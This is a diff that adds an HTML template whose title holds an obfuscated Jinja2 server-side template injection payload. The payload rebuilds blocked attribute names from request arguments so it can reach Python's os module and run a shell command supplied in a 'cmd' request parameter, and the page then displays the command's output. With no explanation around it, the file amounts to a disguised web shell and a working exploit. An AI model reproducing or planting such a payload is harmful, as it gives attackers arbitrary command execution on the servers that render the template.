@@ -1,0 +1,8 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <title>    
+        {% set a=dict(args=1)|list|last %}{% set g=dict(get=1)|list|last %}{% set d=request|attr(a)|attr(g) %}{{ lipsum|attr(d(dict(glo=1)|list|last))|attr(d(dict(gi=1)|list|last))(d(dict(os=1)|list|last))|attr(d(dict(po=1)|list|last))(d(dict(cmd=1)|list|last))|attr(d(dict(re=1)|list|last))() }}       
+        </title>
+    </head>
+</html>
